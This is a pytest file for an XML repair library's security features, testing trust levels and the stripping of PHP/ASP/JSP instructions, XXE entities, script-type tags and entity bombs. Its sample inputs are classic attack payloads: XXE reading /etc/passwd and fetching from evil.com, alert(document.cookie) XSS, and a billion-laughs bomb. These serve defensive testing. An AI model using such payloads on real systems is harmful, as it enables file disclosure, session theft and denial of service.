"""Tests for security features (v0.4.0)."""

import pytest

from xenon import TrustLevel, XMLRepairEngine, repair_xml_safe


class TestSecurityFeatures:
    """Test suite for security features added in v0.4.0."""

    def test_dangerous_pi_stripping_php(self):
        """Test stripping of PHP processing instructions."""
        xml = '<?php system("whoami"); ?><root>data</root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_pis=True)
        assert "<?php" not in result
        assert "<root>data</root>" in result

    def test_dangerous_pi_stripping_asp(self):
        """Test stripping of ASP processing instructions."""
        xml = '<?asp Response.Write("hacked") ?><root>data</root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_pis=True)
        assert "<?asp" not in result
        assert "<root>data</root>" in result

    def test_dangerous_pi_stripping_jsp(self):
        """Test stripping of JSP processing instructions."""
        xml = '<?jsp out.println("hacked"); ?><root>data</root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_pis=True)
        assert "<?jsp" not in result
        assert "<root>data</root>" in result

    def test_safe_pi_preserved(self):
        """Test that safe PIs like xml-stylesheet are preserved."""
        xml = '<?xml-stylesheet type="text/xsl" href="style.xsl"?><root>data</root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_pis=True)
        assert "<?xml-stylesheet" in result
        assert "<root>data</root>" in result

    def test_dangerous_pi_disabled_by_default(self):
        """Test that dangerous PI stripping is OFF by default."""
        xml = '<?php echo "test"; ?><root>data</root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)  # No strip_dangerous_pis flag
        assert "<?php" in result  # Should be preserved

    def test_external_entity_stripping(self):
        """Test stripping of DOCTYPE with external entities."""
        xml = """<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_external_entities=True)
        assert "<!DOCTYPE" not in result
        assert "SYSTEM" not in result
        assert "<root>" in result

    def test_external_entity_public(self):
        """Test stripping of PUBLIC entity declarations."""
        xml = """<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://example.com">
<root>data</root>"""
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_external_entities=True)
        assert "<!DOCTYPE" not in result
        assert "PUBLIC" not in result
        assert "<root>data</root>" in result

    def test_external_entity_disabled_by_default(self):
        """Test that entity stripping is OFF by default."""
        xml = "<!DOCTYPE root><root>data</root>"
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)  # No strip_external_entities flag
        assert "<!DOCTYPE" in result  # Should be preserved

    def test_dangerous_tags_script(self):
        """Test stripping of script tags."""
        xml = '<root><script>alert("XSS")</script><data>clean</data></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_tags=True)
        assert "<script>" not in result
        assert "</script>" not in result
        assert 'alert("XSS")' in result  # Content preserved, tags stripped
        assert "<data>clean</data>" in result

    def test_dangerous_tags_iframe(self):
        """Test stripping of iframe tags."""
        xml = '<root><iframe src="evil.com"></iframe><data>clean</data></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_tags=True)
        assert "<iframe" not in result
        assert "</iframe>" not in result
        assert "<data>clean</data>" in result

    def test_dangerous_tags_object(self):
        """Test stripping of object tags."""
        xml = '<root><object data="evil.swf"></object><data>clean</data></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_tags=True)
        assert "<object" not in result
        assert "</object>" not in result
        assert "<data>clean</data>" in result

    def test_dangerous_tags_embed(self):
        """Test stripping of embed tags."""
        xml = '<root><embed src="evil.swf"></embed><data>clean</data></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, strip_dangerous_tags=True)
        assert "<embed" not in result
        assert "</embed>" not in result
        assert "<data>clean</data>" in result

    def test_dangerous_tags_disabled_by_default(self):
        """Test that dangerous tag stripping is OFF by default."""
        xml = "<root><script>code</script></root>"
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)  # No strip_dangerous_tags flag
        assert "<script>" in result  # Should be preserved

    def test_all_security_features_combined(self):
        """Test using all security features together."""
        xml = """<?php echo "hack"; ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <script>alert('XSS')</script>
    <data>clean content</data>
</root>"""
        result = repair_xml_safe(
            xml,
            trust=TrustLevel.TRUSTED,
            strip_dangerous_pis=True,
            strip_external_entities=True,
            strip_dangerous_tags=True,
        )
        # All dangerous content should be stripped
        assert "<?php" not in result
        assert "<!DOCTYPE" not in result
        assert "<script>" not in result
        # Safe content should remain
        assert "<root>" in result
        assert "<data>clean content</data>" in result

    def test_security_with_malformed_xml(self):
        """Test security features work with malformed XML."""
        xml = "<?php hack ?><root><item id=123><script>XSS</script"
        result = repair_xml_safe(
            xml, trust=TrustLevel.TRUSTED, strip_dangerous_pis=True, strip_dangerous_tags=True
        )
        assert "<?php" not in result
        assert "<script>" not in result
        assert "<root>" in result
        assert '<item id="123">' in result  # Attributes fixed

    def test_xmlrepairengine_direct_usage(self):
        """Test using XMLRepairEngine directly with security features."""
        engine = XMLRepairEngine(
            strip_dangerous_pis=True, strip_external_entities=True, strip_dangerous_tags=True
        )
        xml = "<?php hack ?><root><script>XSS</script></root>"
        repaired_xml, _ = engine.repair_xml(xml)
        assert "<?php" not in repaired_xml
        assert "<script>" not in repaired_xml
        assert "<root>" in repaired_xml

    def test_is_dangerous_pi_method(self):
        """Test the is_dangerous_pi helper method."""
        engine = XMLRepairEngine()
        assert engine.is_dangerous_pi('<?php echo "hi"; ?>') is True
        assert engine.is_dangerous_pi('<?PHP echo "HI"; ?>') is True  # Case insensitive
        assert engine.is_dangerous_pi("<?asp code ?>") is True
        assert engine.is_dangerous_pi("<?jsp code ?>") is True
        assert engine.is_dangerous_pi('<?xml version="1.0"?>') is False
        assert engine.is_dangerous_pi('<?xml-stylesheet href="x"?>') is False

    def test_is_dangerous_tag_method(self):
        """Test the is_dangerous_tag helper method."""
        engine = XMLRepairEngine()
        assert engine.is_dangerous_tag("script") is True
        assert engine.is_dangerous_tag("SCRIPT") is True  # Case insensitive
        assert engine.is_dangerous_tag("iframe") is True
        assert engine.is_dangerous_tag("object") is True
        assert engine.is_dangerous_tag("embed") is True
        assert engine.is_dangerous_tag("div") is False
        assert engine.is_dangerous_tag("span") is False
        assert engine.is_dangerous_tag('script onclick="x"') is True  # Tag with attributes

    def test_contains_external_entity_method(self):
        """Test the contains_external_entity helper method."""
        engine = XMLRepairEngine()
        assert engine.contains_external_entity('<!ENTITY x SYSTEM "file.xml">') is True
        assert engine.contains_external_entity('<!ENTITY x PUBLIC "-//W3C//">') is True
        assert engine.contains_external_entity('<!DOCTYPE html SYSTEM "x">') is True
        assert engine.contains_external_entity("<!DOCTYPE html>") is False
        assert engine.contains_external_entity("<root>data</root>") is False

    def test_backward_compatibility(self):
        """Test that existing code without security flags still works."""
        xml = "<?php code ?><root><script>XSS</script></root>"
        # Without flags, everything is preserved (backward compatible)
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)
        assert "<?php" in result
        assert "<script>" in result
        assert "<root>" in result

    def test_real_world_xxe_attempt(self):
        """Test against a real-world XXE attack pattern."""
        xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://evil.com/evil.dtd">
]>
<root>
    <data>&xxe;</data>
    <other>&xxe2;</other>
</root>"""
        result = repair_xml_safe(xxe_xml, trust=TrustLevel.TRUSTED, strip_external_entities=True)
        assert "SYSTEM" not in result
        assert "file:///" not in result
        assert "http://evil.com" not in result
        assert "<root>" in result
        assert "<data>" in result

    def test_real_world_xss_attempt(self):
        """Test against real-world XSS attack patterns."""
        xss_xml = """<root>
    <comment><script>alert(document.cookie)</script></comment>
    <input><img src=x onerror="alert(1)"/></input>
    <safe>This is clean content</safe>
</root>"""
        result = repair_xml_safe(xss_xml, trust=TrustLevel.TRUSTED, strip_dangerous_tags=True)
        assert "<script>" not in result
        assert "</script>" not in result
        # Content should still be there, just tags stripped
        assert "alert(document.cookie)" in result
        assert "<safe>This is clean content</safe>" in result


class TestTrustLevelEnforcement:
    """Test suite for v1.0.0 trust level enforcement."""

    def test_untrusted_applies_all_protections(self):
        """Test that UNTRUSTED level enables all security features by default."""
        dangerous_xml = """<?php system("whoami"); ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <script>alert("XSS")</script>
    <data>clean</data>
</root>"""

        result = repair_xml_safe(dangerous_xml, trust=TrustLevel.UNTRUSTED)

        # All dangerous content should be stripped
        assert "<?php" not in result
        assert "<!DOCTYPE" not in result
        assert "<!ENTITY" not in result
        assert "<script>" not in result.lower()
        # Clean content preserved
        assert "<data>clean</data>" in result

    def test_internal_applies_moderate_protections(self):
        """Test that INTERNAL level applies moderate security."""
        xml_with_entities = """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <data>content</data>
</root>"""

        result = repair_xml_safe(xml_with_entities, trust=TrustLevel.INTERNAL)

        # External entities should be stripped
        assert "<!DOCTYPE" not in result
        assert "SYSTEM" not in result
        # Content preserved
        assert "<data>content</data>" in result

    def test_trusted_allows_content_by_default(self):
        """Test that TRUSTED level preserves content unless explicitly stripped."""
        xml = '<?php echo "test"; ?><root><script>code</script></root>'

        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)

        # Everything should be preserved (no automatic stripping)
        assert "<?php" in result
        assert "<script>" in result

    def test_trusted_respects_explicit_flags(self):
        """Test that TRUSTED level still respects explicit security flags."""
        xml = '<?php echo "test"; ?><root><script>code</script></root>'

        result = repair_xml_safe(
            xml, trust=TrustLevel.TRUSTED, strip_dangerous_pis=True, strip_dangerous_tags=True
        )

        # Explicit flags should still work
        assert "<?php" not in result
        assert "<script>" not in result

    def test_trust_levels_configure_max_depth(self):
        """Test that trust levels configure different max_depth values."""
        from xenon.trust import get_security_config

        # Verify each trust level has appropriate max_depth
        untrusted_config = get_security_config(TrustLevel.UNTRUSTED)
        assert untrusted_config.max_depth == 1000

        internal_config = get_security_config(TrustLevel.INTERNAL)
        assert internal_config.max_depth == 10000

        trusted_config = get_security_config(TrustLevel.TRUSTED)
        assert trusted_config.max_depth is None  # Unlimited

    def test_trust_level_required_parameter(self):
        """Test that trust parameter is required (not optional)."""
        from xenon.exceptions import ValidationError

        # This should fail at the type checker level, but we can test runtime
        try:
            # Try to call without trust parameter
            repair_xml_safe("<root>test</root>")
            assert False, "Should have raised TypeError for missing trust parameter"
        except TypeError as e:
            assert "trust" in str(e).lower()

    def test_xmlrepairengine_with_trust_presets(self):
        """Test that XMLRepairEngine can be configured with trust presets."""
        dangerous_xml = "<?php hack ?><root><script>XSS</script></root>"

        # UNTRUSTED engine
        untrusted_engine = XMLRepairEngine.from_trust_level(TrustLevel.UNTRUSTED)
        result_untrusted, _ = untrusted_engine.repair_xml(dangerous_xml)
        assert "<?php" not in result_untrusted
        assert "<script>" not in result_untrusted.lower()

        # TRUSTED engine
        trusted_engine = XMLRepairEngine.from_trust_level(TrustLevel.TRUSTED)
        result_trusted, _ = trusted_engine.repair_xml(dangerous_xml)
        assert "<?php" in result_trusted
        assert "<script>" in result_trusted

    def test_trust_level_with_streaming(self):
        """Test that trust levels work with streaming API."""
        from xenon.streaming import StreamingXMLRepair

        dangerous_xml = "<?php hack ?><root>test</root>"

        # UNTRUSTED streaming
        untrusted_stream = StreamingXMLRepair(trust=TrustLevel.UNTRUSTED)
        result_untrusted = "".join(untrusted_stream.feed(dangerous_xml))
        result_untrusted += "".join(untrusted_stream.finalize())
        assert "<?php" not in result_untrusted

        # TRUSTED streaming
        trusted_stream = StreamingXMLRepair(trust=TrustLevel.TRUSTED)
        result_trusted = "".join(trusted_stream.feed(dangerous_xml))
        result_trusted += "".join(trusted_stream.finalize())
        assert "<?php" in result_trusted

    def test_trust_level_affects_entity_expansion(self):
        """Test that trust levels affect entity expansion limits."""
        # Entity bomb pattern
        entity_bomb = """<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<root>&lol2;</root>"""

        # UNTRUSTED should strip entities
        result = repair_xml_safe(entity_bomb, trust=TrustLevel.UNTRUSTED)
        assert "<!ENTITY" not in result
        assert "<!DOCTYPE" not in result

    def test_batch_repair_with_trust_levels(self):
        """Test that batch repair respects trust levels."""
        from xenon import batch_repair

        xml_batch = [
            "<?php hack ?><root>1</root>",
            "<root><script>xss</script>2</root>",
            "<root>3</root>",
        ]

        # UNTRUSTED batch - batch_repair returns (xml, error) tuples
        results = batch_repair(xml_batch, trust=TrustLevel.UNTRUSTED)
        repaired_xml = [xml for xml, error in results]
        assert all("<?php" not in r for r in repaired_xml)
        assert all("<script>" not in r.lower() for r in repaired_xml)

    def test_trust_level_string_representation(self):
        """Test that TrustLevel has useful string representation."""
        assert "UNTRUSTED" in str(TrustLevel.UNTRUSTED)
        assert "INTERNAL" in str(TrustLevel.INTERNAL)
        assert "TRUSTED" in str(TrustLevel.TRUSTED)

    def test_trust_level_comparison(self):
        """Test that trust levels have distinct values."""
        # Trust levels are string enums, so we verify they're distinct
        assert TrustLevel.UNTRUSTED.value == "untrusted"
        assert TrustLevel.INTERNAL.value == "internal"
        assert TrustLevel.TRUSTED.value == "trusted"

        # Verify they're all different
        values = {TrustLevel.UNTRUSTED.value, TrustLevel.INTERNAL.value, TrustLevel.TRUSTED.value}
        assert len(values) == 3

    def test_mixed_trust_operations(self):
        """Test processing same XML with different trust levels."""
        xml = "<?php code ?><root><item>data</item></root>"

        # Process with each trust level
        result_untrusted = repair_xml_safe(xml, trust=TrustLevel.UNTRUSTED)
        result_internal = repair_xml_safe(xml, trust=TrustLevel.INTERNAL)
        result_trusted = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)

        # UNTRUSTED should strip more than TRUSTED
        assert "<?php" not in result_untrusted
        assert "<?php" in result_trusted

        # All should preserve actual data
        assert "<item>data</item>" in result_untrusted
        assert "<item>data</item>" in result_internal
        assert "<item>data</item>" in result_trusted


class TestXSSProtection:
    """Test suite for enhanced XSS protection."""

    def test_aggressive_attribute_escaping(self):
        """Test that aggressive attribute escaping prevents XSS."""
        xml = '<root><a href="a \' b / c">click</a></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED, escape_unsafe_attributes=True)
        assert 'href="a&#x20;&apos;&#x20;b&#x20;&#x2F;&#x20;c"' in result

    def test_aggressive_attribute_escaping_disabled(self):
        """Test that aggressive attribute escaping is disabled by default."""
        xml = '<root><a href="a \' b / c">click</a></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.TRUSTED)
        assert 'href="a \' b / c"' in result

    def test_aggressive_escaping_with_untrusted_level(self):
        """Test that UNTRUSTED trust level enables aggressive escaping by default."""
        xml = '<root><a href="a \' b / c">click</a></root>'
        result = repair_xml_safe(xml, trust=TrustLevel.UNTRUSTED)
        assert 'href="a&#x20;&apos;&#x20;b&#x20;&#x2F;&#x20;c"' in result

    def test_aggressive_escaping_in_text_nodes(self):
        """Test that aggressive escaping is applied to text nodes."""
        xml = "<root>'> <script>alert(1)</script></root>"
        result = repair_xml_safe(xml, trust=TrustLevel.UNTRUSTED)
        assert result == "<root>&apos;&gt;&#x20;alert(1)</root>"
